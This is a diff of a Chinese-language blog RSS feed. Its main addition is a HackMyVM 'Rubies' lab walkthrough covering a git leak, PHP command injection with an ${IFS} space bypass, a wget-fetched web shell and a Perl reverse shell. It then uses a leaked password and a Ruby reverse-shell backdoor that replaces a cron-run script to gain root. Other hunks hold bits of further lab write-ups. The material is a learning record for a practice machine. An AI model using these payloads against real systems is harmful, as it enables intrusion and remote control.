@@ -1,4 +1,226 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 30 Dec 2024 14:44:03 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 30 Dec 2024 14:43:20 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[Misc]]></title><description><![CDATA[ 
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 30 Dec 2024 15:52:15 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 30 Dec 2024 15:52:10 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[19.rubies]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
+
+<br><a data-tooltip-position="top" aria-label="2.1. git泄露" data-href="#2.1. git泄露" href="https://www.c1trus.top/about:blank#2.1._git泄露" class="internal-link" target="_self" rel="noopener nofollow">2.1. git泄露</a>
+<br><a data-tooltip-position="top" aria-label="2.2. 文件上传" data-href="#2.2. 文件上传" href="https://www.c1trus.top/about:blank#2.2._文件上传" class="internal-link" target="_self" rel="noopener nofollow">2.2. 文件上传</a>
+
+
+<br><a data-tooltip-position="top" aria-label="3. 代码审计 RCE利用" data-href="#3. 代码审计 RCE利用" href="https://www.c1trus.top/about:blank#3._代码审计_RCE利用" class="internal-link" target="_self" rel="noopener nofollow">3. 代码审计 RCE利用</a>
+<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
+<br><a data-tooltip-position="top" aria-label="5. git再利用" data-href="#5. git再利用" href="https://www.c1trus.top/about:blank#5._git再利用" class="internal-link" target="_self" rel="noopener nofollow">5. git再利用</a>
+<br><a data-tooltip-position="top" aria-label="6. 再提权root" data-href="#6. 再提权root" href="https://www.c1trus.top/about:blank#6._再提权root" class="internal-link" target="_self" rel="noopener nofollow">6. 再提权root</a>
+<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Rubies
+<br>作者： <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=ch4rm" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=ch4rm" target="_blank">ch4rm</a><br>难度：⭐️⭐️⭐️⭐️
+<br>知识点：ruby操作、空格绕过、文件替换、git利用
+<br><br>nmap -sC -sV -p- 192.168.56.12
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 19:34 CST
+Nmap scan report for 192.168.56.12
+Host is up (0.00023s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 54:65:0b:7a:f3:5c:2f:1f:14:9e:bb:0e:44:0c:af:29 (RSA)
+|   256 1f:5d:63:05:65:f7:cf:70:e4:0d:0a:45:80:77:50:2c (ECDSA)
+|\_  256 69:a2:0f:83:dc:19:f2:c1:72:9c:a3:f8:09:44:3e:36 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|\_http-title: Cute Cat Only
+|\_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-git:
+|   192.168.56.12:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|\_    Last commit message: Why minnie?
+MAC Address: 08:00:27:14:E7:BF (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
+<br>主页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png" referrerpolicy="no-referrer"><br>这里有两个按钮 还有一个next ，next会显示一些关于猫咪的故事<br>扫下目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.002.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.003.png" referrerpolicy="no-referrer"><br>两个利用点，git泄露与文件上传<br><br>python2 GitHack.py http://192.168.56.12/.git/
+[+] Download and parse index file ...
+bg/bg.gif
+index.php
+poems/poem1
+poems/poem2
+poems/poem3
+poems/poem4
+poems/poem5
+uploads/cat1.gif
+uploads/cat2.jpg
+[OK] index.php
+[Error] [Error 183] : u'192.168.56.12\\poems'
+[Error] [Error 183] : u'192.168.56.12\\poems'
+[OK] poems/poem1
+[OK] poems/poem4
+[OK] poems/poem5
+[OK] uploads/cat2.jpg
+[OK] poems/poem2
+[OK] poems/poem3
+[OK] uploads/cat1.gif
+[OK] bg/bg.gif
+<br>没啥东西<br><br>发现有文件上传的按钮 但是是点不了的<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.004.png" referrerpolicy="no-referrer"><br>这多半是本地js控制的 修改一下<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.005.png" referrerpolicy="no-referrer"><br>将disable删掉<br>这样就可以上传文件了<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.006.png" referrerpolicy="no-referrer"><br>这里我上传了一个文件，但是发现不在uploads目录下，或者文件名字被改掉了<br>这里利用Githack获取一下文件目录，看看我的文件上传到哪里了<br>python2 GitHack.py http://192.168.56.12/.git/
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.007.png" referrerpolicy="no-referrer"><br> Upload functionality is currently disabled because Minnie messed up the code, lemme provide you with cute poems for the time being 
+<br>上传功能目前暂时无法使用，因为 Minnie 把代码弄坏了。
+让我先为你提供一些可爱的诗句吧！
+<br>获取到一个用户名字<br>Minnie
+<br><br>打开index.php，审计发现这里存在一个Rce漏洞<br> 用d盾也能扫出来<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.008.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.009.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.010.png" referrerpolicy="no-referrer"><br>差不多就是这样<br>&lt;?php echo $input ?&gt;
+<br>$input是我们可以控制的。传入参数是poem<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.011.png" referrerpolicy="no-referrer"><br>尝试Rce发现 有waf<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.012.png" referrerpolicy="no-referrer"><br>再回去看下代码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.013.png" referrerpolicy="no-referrer"><br>过滤了空格<br>这个绕过用${IFS}即可<br>这里不太好直接弹shell<br>我们先传一个系统马上去<br>&lt;?php system($\_POST['cmd']);
+echo "ok"?&gt;
+<br>http://192.168.56.12/index.php?poem=;wget${IFS}http://192.168.56.6/shell.php
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.014.png" referrerpolicy="no-referrer"><br>然后弹shell<br>cmd=perl%20-e%20'use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1122%3Bsocket(S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr\_in(%24p%2Cinet\_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B'
+<br><br>提权检测<br>(remote) www-data@rubies:/home/minnie$ /sbin/getcap -r / 2&gt;/dev/null
+/usr/bin/systemd-detect-virt = cap\_dac\_override,cap\_sys\_ptrace+ep
+/usr/bin/traceroute6.iputils = cap\_net\_raw+ep
+/usr/bin/mtr = cap\_net\_raw+ep
+
+(remote) www-data@rubies:/var/www/html/uploads$ find / -perm -4000 2&gt;/dev/null
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/at
+/bin/ping
+/bin/ping6
+/bin/mount
+/bin/fusermount
+/bin/su
+/bin/umount
+<br>看下用户目录下的提示<br>(remote) www-data@rubies:/home/minnie$ cat note.txt
+Put anything you'd like to in the folder,
+do not do dumb stuff pls
+<br>“可以把任何你想要的东西放进这个文件夹里，
+请不要做蠢事，谢谢。”
+<br>意思是我们可以放任何东西到这个目录下<br>那我们是不是可以放我们的公钥呢<br>(remote) www-data@rubies:/home$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Nov  2  2020 .
+drwxr-xr-x 23 root root 4096 Nov  2  2020 ..
+drwxr-xr-x  2 root root 4096 Nov  2  2020 minnie
+<br>骗子啊。没有写入权限<br>还是看看提权吧<br>/usr/bin/systemd-detect-virt = cap\_dac\_override,cap\_sys\_ptrace+ep
+/usr/bin/traceroute6.iputils = cap\_net\_raw+ep
+/usr/bin/mtr = cap\_net\_raw+ep
+<br>好像没有什么可以利用的<br><br>之前利用githack获取到了其中的Git目录下的一些文件<br>查看大佬的wp发现还有个GitTools工具<br>利用这个工具可以获取到包含一些凭据的历史记录...<br>/home/gitTools-v0.0.1/Dumper/gitdumper.sh http://192.168.56.12/.git/ git
+cd /home/gitTools-v0.0.1/Dumper/git/.git
+ git show HEAD
+commit 052a0cb4865e29bc03278105e0232b20173f933d (HEAD -&gt; master)
+Author: Your Name &lt;root@rubies.com&gt;
+Date:   Mon Nov 2 14:27:16 2020 +0800
+
+    Why minnie?
+
+diff --git a/index.php b/index.php
+index 41f0f2f..d33ca0d 100644
+--- a/index.php
++++ b/index.php
+@@ -8,33 +8,6 @@ if(isset($\_GET['poem'])){
+                $output = shell\_exec("cat poems/".$input);
+        }
+ }
+-
+-
+-// we dont need a login page dangit minnie! follow my orders pls
+-$servername = "localhost";
+-$username = "root";
+-$password = "jd92khn49w";
+-
+-$conn = new mysqli($servername, $username, $password);
+-
+-if ($conn-&gt;connect\_error) {
+-  die("Connection failed: " . $conn-&gt;connect\_error);
+-}
+-
+-$login\_username=$\_POST['username'];
+-$login\_password=$\_POST['password'];
+-
+-$sql = "SELECT \* FROM users WHERE Username = '$login\_username' AND Password = '$login\_password' ";
+-$result = mysqli\_query($con,$sql);
+-
+-if(sqmli\_num\_rows($result)&lt;1){i
+-       $\_SESSION['login']=$user\_id;
+-       header('Location: http://ch4rm.pw/dashboard');
+-}
+-else{
+-       $error = True;
+-}
+-
+ ?&gt;
+
+ &lt;html&gt;
+(END)
+<br>这里获取到一个密码<br>jd92khn49w
+<br>经过尝试这是minnie用户的密码<br><br>su到minnie后发现minnie用户是一个Ruby Interactive shell （irb）<br>使用命令切换到一个bash shell<br>system("bash")
+<br>H0wc00l\_i5\_Byp@@s1n9
+<br>上面的几个提权检测没有东西<br>我们用pspy64看一下<br>2024/11/18 21:58:01 CMD: UID=0    PID=2681   | /bin/sh -c /usr/bin/ruby /root/bundle.rb
+2024/11/18 21:58:01 CMD: UID=0    PID=2680   | /bin/sh -c /usr/bin/ruby /root/bundle.rb
+2024/11/18 21:58:01 CMD: UID=0    PID=2679   | /usr/sbin/CRON -f
+2024/11/18 21:58:01 CMD: UID=0    PID=2682   | /bin/sh /sbin/dhclient-script
+2024/11/18 21:58:01 CMD: UID=0    PID=2687   | /bin/sh /sbin/resolvconf -a enp0s3.dhclient
+2024/11/18 21:58:01 CMD: UID=0    PID=2685   | /bin/sh /sbin/resolvconf -a enp0s3.dhclient
+2024/11/18 21:58:01 CMD: UID=0    PID=2693   | /usr/bin/ruby /root/bundle.rb
+<br>发现其每隔一段时间会运行一个ruby的脚本bundle.rb<br> /bin/sh -c /usr/bin/ruby /root/bundle.rb
+<br>但是我们好像办法控制这个ruby脚本<br>再用linpeas.sh检测一下<br>发现/opt/cleaning目录是属于我们当前用户组的<br>而且这个目录下面还有文件<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.015.png" referrerpolicy="no-referrer"><br>这不得不让我感到有点好奇了<br>进目录看一下<br>ls -la
+total 12
+drwxrwxr-x 2 root minnie 4096 Nov  2  2020 .
+drwxr-xr-x 3 root root   4096 Nov  2  2020 ..
+-rw-r--r-- 1 root root    108 Nov  2  2020 webserver\_upload.rb
+<br>目录下有一个.rb脚本<br>minnie@rubies:/opt/cleaning$ cat webserver\_upload.rb
+require "find"
+
+Find.find("/var/www/html/uploads/") do |file|
+  File.delete("#{file}") if file=~/\.php/
+end
+<br>作用就是删掉我们网站uploads目录里面所有的php文件<br>看这个功能就大概可以猜测到这个文件肯定类似于一个定时任务会每隔一段时间就被执行，只是不知道为什么pspy64没有检测到<br>既然我们这个用户组有这个目录的权限<br>那我们可以替换掉这个文件<br>先删掉，然后创建一个同名的ruby后门<br>#!/usr/bin/env ruby
+
+require 'socket'
+require 'open3'
+
+#Set the Remote Host IP
+RHOST = "192.168.56.6" 
+#Set the Remote Host Port
+PORT = "1234"
+
+#Tries to connect every 20 sec until it connects.
+begin
+sock = TCPSocket.new "#{RHOST}", "#{PORT}"
+sock.puts "We are connected!"
+rescue
+  sleep 20
+  retry
+end
+
+#Runs the commands you type and sends you back the stdout and stderr.
+begin
+  while line = sock.gets
+    Open3.popen2e("#{line}") do | stdin, stdout\_and\_stderr |
+              IO.copy\_stream(stdout\_and\_stderr, sock)
+              end  
+  end
+rescue
+  retry
+end 
+<br>开启监听等待一会 成功反弹shell提权root<br>很离谱这个root.txt可能有不可见字符<br>直接读取不了<br>cat \*root.txt\*
+pyth0N&gt;r00bi35
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/19.rubies.html</link><guid isPermaLink="false">24-渗透/HMV/19.rubies.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 14:54:39 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Drawing 2024-12-24 15.53.06]]></title><description><![CDATA[ 
+ 
+  
+  
+  
+    
+    
+  
+  ]]></description><link>https://www.c1trus.top/excalidraw/drawing-2024-12-24-15.53.06.excalidraw.html</link><guid isPermaLink="false">Excalidraw/Drawing 2024-12-24 15.53.06.excalidraw.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 05:44:52 GMT</pubDate></item><item><title><![CDATA[Misc]]></title><description><![CDATA[ 
  <br><br>hashcat破解就行了<br>$6$xyz$ZGQOqL77wiYAgPxsNEv2Kz3INjzK4JdG29RbaHaW5lrkH8bA8W7kC3GK4CctGrFO7.E2va7kSgF3eQXNWYQee.:reddragon
 
 Session..........: hashcat
@@ -140,7 +362,7 @@ HMV{1lordp4}
 <img alt="assets/QQ20241225-001850.png" src="https://www.c1trus.top/24-渗透/hmv/challenges/assets/qq20241225-001850.png"><br>HMV{engraving_a_trophy_for_Kerszi}
 <br><br>用010查看发现是png<br>cybercheaf 解密 用hexdump下来即可<br>
 <img alt="assets/Pasted image 20241225003154.png" src="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241225003154.png"><br>解密后图片上有一个Base64编码的flag<br>HMV{ancienttimes1880}
-<br><br>HMV{ilikechinese}]]></description><link>https://www.c1trus.top/24-渗透/hmv/challenges/misc.html</link><guid isPermaLink="false">24-渗透/HMV/challenges/Misc.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241224225402.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241224225402.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[49.otte]]></title><description><![CDATA[ 
+<br><br>HMV{ilikechinese}]]></description><link>https://www.c1trus.top/24-渗透/hmv/challenges/misc.html</link><guid isPermaLink="false">24-渗透/HMV/challenges/Misc.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241224225402.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241224225402.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[49.otte]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -483,7 +705,7 @@ User cedric may run the following commands on otte:
 (remote) root@otte:/home/cedric$ id
 uid=0(root) gid=0(root) groups=0(root)
 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/49.otte.html</link><guid isPermaLink="false">24-渗透/HMV/49.otte.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 14:05:08 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[48.deba]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/49.otte.html</link><guid isPermaLink="false">24-渗透/HMV/49.otte.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 14:05:08 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[48.deba]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -719,7 +941,7 @@ root
 root@debian:~# cat /root/root.txt
 BoFsavetheworld
 
-<br>最后，其实这里也可以用 pwnkit 漏洞进行内核提权]]></description><link>https://www.c1trus.top/24-渗透/hmv/48.deba.html</link><guid isPermaLink="false">24-渗透/HMV/48.deba.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 27 Dec 2024 11:09:05 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Alzheimer]]></title><description><![CDATA[ 
+<br>最后，其实这里也可以用 pwnkit 漏洞进行内核提权]]></description><link>https://www.c1trus.top/24-渗透/hmv/48.deba.html</link><guid isPermaLink="false">24-渗透/HMV/48.deba.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 27 Dec 2024 11:09:05 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Alzheimer]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -817,7 +1039,7 @@ Ihavebeenalwayshere!!!
 /usr/bin/gpasswd
 /usr/sbin/capsh
 <br>capsh --gid=0 --uid=0 --
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.003.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/9.alzheimer.html</link><guid isPermaLink="false">24-渗透/HMV/9.Alzheimer.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[8.BaseME]]></title><description><![CDATA[ 
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.003.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/9.alzheimer.html</link><guid isPermaLink="false">24-渗透/HMV/9.Alzheimer.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/9.Alzheimer.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[8.BaseME]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -915,7 +1137,7 @@ User lucas may run the following commands on baseme:
     (ALL) NOPASSWD: /usr/bin/base64
 lucas@baseme:~$ 
 <br>sudo base64 "/root/root.txt" |base64 --decode
-<br>这里应该读取私钥然后连接<br>我这里直接偷懒读取flag了]]></description><link>https://www.c1trus.top/24-渗透/hmv/8.baseme.html</link><guid isPermaLink="false">24-渗透/HMV/8.BaseME.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Hommie]]></title><description><![CDATA[ 
+<br>这里应该读取私钥然后连接<br>我这里直接偷懒读取flag了]]></description><link>https://www.c1trus.top/24-渗透/hmv/8.baseme.html</link><guid isPermaLink="false">24-渗透/HMV/8.BaseME.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/8.BaseME.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Hommie]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 1.信息收集" data-href="#2. 1.信息收集" href="https://www.c1trus.top/about:blank#2._1.信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 1.信息收集</a>
@@ -1086,7 +1308,7 @@ gmxzbd40GES6DWsAAAALcm9vdEBob21taWU=
 vi id\_rsa
 chmod 600 id\_rsa
 ssh -i id\_rsa root@127.0.0.1
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.005.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/7.hommie.html</link><guid isPermaLink="false">24-渗透/HMV/7.Hommie.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[6.Five]]></title><description><![CDATA[ 
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.005.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/7.hommie.html</link><guid isPermaLink="false">24-渗透/HMV/7.Hommie.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[6.Five]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 1.信息收集" data-href="#2. 1.信息收集" href="https://www.c1trus.top/about:blank#2._1.信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 1.信息收集</a>
@@ -1224,7 +1446,7 @@ if ($uploadOk == 0) {
 {
 return 403;
 }
